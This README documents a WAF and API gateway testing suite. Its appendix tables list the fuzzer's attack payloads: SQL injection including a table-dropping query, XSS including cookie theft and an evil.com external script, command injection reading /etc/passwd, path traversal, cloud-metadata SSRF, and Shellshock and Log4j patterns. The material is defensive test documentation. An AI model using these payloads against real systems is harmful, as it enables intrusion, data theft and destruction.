\# WAF \& API Gateway Testing Suite

This project provides a comprehensive suite of tools designed to test the functionality, security contract enforcement, and performance of Web Application Firewalls (WAFs) and API Gateways.

This suite was generated on Monday, 13 October 2025, and is configured to run on \*\*Port 8000\*\* to avoid common conflicts (like those on macOS development environments).

\#\# Testing Philosophy: Permissive Backend

A crucial design principle of this suite is that the \*\*API Server (\\\`api.py\\\`)\*\* is intentionally permissive. It does not perform any of its own contract validation. This is deliberate.

This design ensures that when you run the test scripts, any request that is blocked can be attributed \*\*exclusively to the WAF or API Gateway\*\* you are testing. It removes all ambiguity and creates a pure test of your security layer's effectiveness.

When you run the testers against the API with \*\*no WAF\*\*, you should expect to see almost all tests \*\*FAIL\*\* (i.e., "ALLOWED" or "NOT blocked"). This is your baseline. The tests will only start to \*\*PASS\*\* when you place a properly configured WAF in front of the API.

\#\# Core Tools

1\. \*\*API Server (\\\`api.py\\\`)\*\*: A versatile Flask backend with a variety of diagnostic endpoints.
2\. \*\*Functional Tester (\\\`tester.py\\\`)\*\*: A script to run targeted security tests against specific endpoints and scenarios.
3\. \*\*WAF Efficacy Fuzzer (\\\`fuzzer.py\\\`)\*\*: A powerful tool that sends a list of common attack patterns to the API to systematically test a WAF's signature and contract enforcement rules.
4\. \*\*Performance Tester (\\\`perf\_tester.py\\\`)\*\*: A live dashboard tool to measure the latency impact of your security layer.

\#\# Setup

Follow these steps in your project directory to set up the necessary Python environments.

1\. \*\*Make the setup scripts executable:\*\*
\\\`\\\`\\\`zsh
chmod +x setup\_api.sh setup\_testers.sh
\\\`\\\`\\\`
2\. \*\*Set up the API server environment:\*\*
\\\`\\\`\\\`zsh
./setup\_api.sh
\\\`\\\`\\\`
3\. \*\*Set up the testers' environment:\*\*
\\\`\\\`\\\`zsh
./setup\_testers.sh
\\\`\\\`\\\`

\#\# Usage

You will need at least two separate terminal windows/tabs to run the suite.

\#\#\# 1\. Run the API Server (on Port 8000)

In your first terminal, activate the environment (\\\`source api\_env/bin/activate\\\`) and then choose \*\*one\*\* of the following modes to run the server.

#### Mode 1: Production-Style Server (with Gunicorn)
This mode uses Gunicorn, a production-grade server. It is more resilient and has its own baseline security protections. This is a realistic test of how your WAF performs in a production-like environment.

\*\*Command:\*\*
\\\`\\\`\\\`zsh
\# For standard output:
gunicorn --bind 0.0.0.0:8000 --workers 4 api:app

\# For verbose output (shows incoming request bodies):
gunicorn --bind 0.0.0.0:8000 --workers 4 api:app -- --verbose
\\\`\\\`\\\`

#### Mode 2: Permissive Development Server (No Gunicorn)
This mode uses Flask's simple built-in development server (Werkzeug). It is \*\*less secure\*\* and far more permissive than Gunicorn. This is the \*\*ideal mode for pure WAF testing\*\*, as it creates a "dumb" target that trusts all inputs, ensuring that any blocks you see are 100% from your WAF.

\*\*Command:\*\*
\\\`\\\`\\\`zsh
\# The --verbose flag is recommended for this mode
python3 api.py --verbose
\\\`\\\`\\\`

\#\#\# 2\. Run the Testers (Against Port 8000)

In your second terminal, activate the testers' environment (\\\`source tester\_env/bin/activate\\\`). The CSV results will automatically log which server (\\\`http\_handler\\\`) was targeted.

\*\*Running the Functional Tester (\\\`tester.py\\\`):\*\*
\\\`\\\`\\\`zsh
python3 tester.py
\\\`\\\`\\\`

\*\*Running the WAF Efficacy Fuzzer (\\\`fuzzer.py\\\`):\*\*
\\\`\\\`\\\`zsh
\# Run the fuzzer:
python3 fuzzer.py

\# Run in verbose mode to see full request details:
python3 fuzzer.py --verbose
\\\`\\\`\\\`

\*\*Running the Performance Tester (\\\`perf\_tester.py\\\`):\*\*
\\\`\\\`\\\`zsh
python3 perf\_tester.py --runs 30 --delay 150
\\\`\\\`\\\`

---

\#\# Appendix: Comprehensive Test Documentation

This section provides a detailed breakdown of every test executed by the three main testing scripts.

\#\#\# A. Functional Test Details (\\\`tester.py\\\`)

The \\\`tester.py\\\` script executes a targeted series of checks against WAF/Gateway core functionality and basic evasion techniques.

| Test Name | Target Endpoint | Request Sent | Expected WAF/Gateway Action | Why it's a test |
| :--- | :--- | :--- | :--- | :--- |
| \*\*Endpoint returns a valid list\*\* | \`GET /usage\` | Standard HTTP GET (No body). | \*\*Allow (Status 200)\*\* | Basic health and availability check to ensure the WAF/Gateway is routing traffic correctly. |
| \*\*Response delay is accurate\*\* | \`GET /delay/200\` | Standard HTTP GET. | \*\*Allow (Status 200)\*\* | Measures the time added by the WAF/Gateway. If the measured delay is significantly \*longer\* than 200ms \+ network latency, the WAF is adding unacceptable overhead. |
| \*\*Responds with HTTP 404/503\*\* | \`GET /response-code/404\` | Standard HTTP GET. | \*\*Allow (Status 404/503)\*\* | Checks if the WAF/Gateway allows error codes to pass through. Some WAFs intercept and transform error pages, which can confuse clients. |
| \*\*Reflects custom User-Agent\*\* | \`GET /headers\` | Includes custom \`User-Agent\` header. | \*\*Allow (Status 200)\*\* | Ensures the WAF/Gateway is transparently passing request headers to the backend and response headers back to the client. |
| \*\*Suspicious chars blocked by contract\*\* | \`POST /chars-contract\` | \`\{\\"data\\": \\"!\\'=\\"\}\` | \*\*BLOCK (Status 4xx)\*\* | Checks strict API contract enforcement. Since the OpenAPI schema specifies \`\^[a-zA-Z0-9]+\$\`, the symbols \*must\* be blocked by the Gateway/WAF. |
| \*\*Suspicious pattern blocked by signature\*\* | \`POST /pattern-check\` | \`\{\\"data\\": \\"1\\' OR \\'1\\'=\\'1\\"\}\` | \*\*BLOCK (Status 4xx)\*\* | Checks basic WAF signature detection for a classic SQL Injection payload. If the backend receives it, the WAF failed its most basic job. |
| \*\*Hex-encoded attack pattern blocked\*\* | \`POST /hex-decode-check\` | \`\{\\"data\\": \\"27204f52202731273d2731\\"\}\` (Hex for \`' OR '1'='1\`) | \*\*BLOCK (Status 4xx)\*\* | Tests WAF's ability to \*\*normalize (decode) Hex\*\* and then apply signature checks to the resulting cleartext payload. This prevents a common bypass technique. |
| \*\*URL-encoded attack pattern blocked\*\* | \`POST /url-decode-diagnostic\` | \`\{\\"data\\": \\"\%3Cscript\%3Ealert(1)\%3C/script\%3E\\"\}\` (URL-encoded XSS) | \*\*BLOCK (Status 4xx)\*\* | Tests WAF's ability to \*\*normalize (decode) URL encoding\*\* and block the underlying XSS payload. This tests another common evasion method. |

\#\#\# B. WAF Efficacy Fuzzer Details (\\\`fuzzer.py\\\`)

The \\\`fuzzer.py\\\` script executes a high-volume, comprehensive test of known attack patterns against two distinct types of endpoints: a loose contract (\\\`-weak\\\`) and a strict contract (\\\`-strict\\\`).

#### SQL Injection (SQLi) Payloads

SQLi attacks attempt to manipulate backend database queries.

| Payload | Technique / Description |
| :--- | :--- |
| \`' OR 1=1--\` | \*\*Classic Tautology:\*\* Attempts to create a universally true condition (\\\`1=1\\\`) to bypass logins or retrieve all records from a table. |
| \`' OR 'a'='a\` | \*\*String-based Tautology:\*\* A variation of the above, using strings instead of integers. |
| \`AND 1=1\` | \*\*Boolean-based Blind:\*\* Used when an attacker cannot see the output. They inject a true/false condition and observe if the page changes. |
| \`UNION SELECT user, password FROM users\` | \*\*UNION Attack:\*\* Attempts to combine the results of the legitimate query with a malicious one that extracts data from another table (e.g., \\\`users\\\`). |
| \`'; DROP TABLE members;--\` | \*\*Stacked Query:\*\* Attempts to terminate the original query (\\\`;\\\`) and execute a second, destructive command. |
| \`OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)\` | \*\*Error-based:\*\* Aims to force the database to produce an error message that contains sensitive data (in this case, the current database user). |
| \`OR IF(1=1, SLEEP(5), 0)\` | \*\*Time-based Blind:\*\* Forces the database to pause (sleep) if a condition is true. The attacker measures response time to infer data. |
| \`admin'--\` | \*\*Authentication Bypass:\*\* Attempts to log in as 'admin' by using a comment (\\\`--\\\`) to nullify the rest of the query (e.g., the password check). |
| \`" OR 1=1--\` | \*\*Double Quote Tautology:\*\* The same as the classic tautology but using double quotes, which are required by some database systems. |
| \`' OR '%'='\` | \*\*Wildcard Bypass:\*\* Uses the \`%\` wildcard character, which can sometimes confuse WAF filters. |

#### Cross-Site Scripting (XSS) Payloads

XSS attacks attempt to inject malicious JavaScript into a web page to be executed by other users' browsers.

| Payload | Technique / Description |
| :--- | :--- |
| \`<script>alert('XSS')</script>\` | \*\*Basic Script Tag:\*\* The most common proof-of-concept to see if a browser will execute an injected script. |
| \`<img src=x onerror=alert(document.cookie)>\` | \*\*Event Handler Injection:\*\* Uses an HTML event attribute (\\\`onerror\\\`) instead of a \`<script>\` tag. This is a common way to bypass basic filters. |
| \`<body onload=alert(1)>\` | \*\*Body Event Handler:\*\* Attempts to inject a script into the \`onload\` event of the page's body tag. |
| \`<svg/onload=alert(1)>\` | \*\*SVG Vector:\*\* Uses the \`onload\` event within an SVG image tag, another vector for bypassing filters that only look for common HTML tags like \`<img>\`. |
| \`<iframe src="javascript:alert(1)">\` | \*\*Iframe Source:\*\* Uses the \`javascript:\` pseudo-protocol within an iframe's source to execute code. |
| \`<ScRiPt>alert(1)</sCrIpT>\` | \*\*Case Obfuscation:\*\* Attempts to bypass simple, case-sensitive WAF rules that might only be looking for lowercase \`<script>\`. |
| \`<script src=http://evil.com/xss.js>\` | \*\*External Script:\*\* Instead of putting the payload inline, this attempts to load a malicious script from an external server. |
| \`<a href="javascript:alert(1)">Click me</a>\` | \*\*Anchor Href:\*\* Injects JavaScript into the \`href\` attribute of a link. The code executes when the link is clicked. |
| \`<input onfocus=alert(1) autofocus>\` | \*\*Input Event Handler:\*\* Uses an event on a form input (\\\`onfocus\\\`) to trigger JavaScript automatically thanks to the \`autofocus\` attribute. |
| \`<video poster=javascript:alert(1)>\` | \*\*HTML5 Video Vector:\*\* Uses an attribute of the HTML5 \`<video>\` tag to execute a script. |

#### Command Injection, Path Traversal, and Other Payloads

| Payload | Type | Technique / Description |
| :--- | :--- | :--- |
| \`| whoami\` | Cmd Injection | \*\*Pipe Execution:\*\* Attempts to pipe the output of the legitimate command into a new, malicious command (\\\`whoami\\\`). |
| \`; ls -la /\` | Cmd Injection | \*\*Semicolon Separator:\*\* Used in Unix-like systems to stack commands. |
| \`&& cat /etc/passwd\` | Cmd Injection | \*\*Logical AND:\*\* Executes the second command only if the first one succeeds. |
| \`../../etc/passwd\` | Path Traversal | \*\*Parent Directory Traversal:\*\* The classic attack using \`../\` to navigate up the directory tree and read a sensitive file. |
| \`\%2e\%2e\%2f\%2e\%2e\%2fetc\%2fpasswd\` | Path Traversal | \*\*URL Encoded:\*\* Hides the \`../\` characters by URL-encoding them to bypass simple string-matching filters. A WAF must decode this. |
| \`http://169.254.169.254/...\` | SSRF | \*\*Cloud Metadata Attack:\*\* Attempts to access the AWS cloud provider's internal metadata service to steal secrets. |
| \`user=guest\%0a\%0dmalicious\_log\`| Log Injection | \*\*CRLF Injection:\*\* Uses URL-encoded newline characters (\\\`\%0a\%0d\\\`) to inject a fake new line into a log file. |
| \`JRMI\` | Deserialization | \*\*Java RMI Header:\*\* The magic bytes for a Java Remote Method Invocation call. |
| \`(){:;}; bash -c \\"..."\` | Shellshock | \*\*Environment Variable Injection:\*\* Tests for the pattern used to exploit the "Shellshock" vulnerability, allowing remote command execution via malformed environment variables. |
| \`\$\{jndi:ldap://...\}\` | Log4j/JNDI | \*\*JNDI Injection:\*\* Tests for the pattern used to exploit Log4j (CVE-2021-44228, "Log4Shell") or other JNDI injection vulnerabilities, allowing remote code loading/execution. |

\#\#\# C. Performance Test Details (\\\`perf\_tester.py\\\`)

The \\\`perf\_tester.py\\\` script focuses on latency and performance overhead. It uses \\\`curl\\\` to capture raw network timing metrics for each request.

| Test Name | Target Endpoint | Request Type | Purpose | Metrics Measured (Time to\.\.\.) |
| :--- | :--- | :--- | :--- | :--- |
| \*\*GET /usage\*\* | \`GET /usage\` | Simple GET | Establishes a \*\*lightweight baseline\*\* for network and application latency. | DNS Lookup, TCP Connect, TTFB, Total Time |
| \*\*POST /hex-decode-check\*\* | \`POST /hex-decode-check\` | POST w/ Body | Measures overhead of processing a JSON request body and checking content against an OpenAPI pattern. | DNS Lookup, TCP Connect, TTFB, Total Time |
| \*\*POST /url-decode-diagnostic\*\* | \`POST /url-decode-diagnostic\` | POST w/ Body | Measures overhead of JSON processing \*and\* a common attack string normalization (URL decoding) task. | DNS Lookup, TCP Connect, TTFB, Total Time |
| \*\*GET /delay/200ms\*\* | \`GET /delay/200\` | Simple GET | Establishes a \*\*known, long baseline\*\* (200ms) to detect latency spikes under load. | DNS Lookup, TCP Connect, TTFB, Total Time |
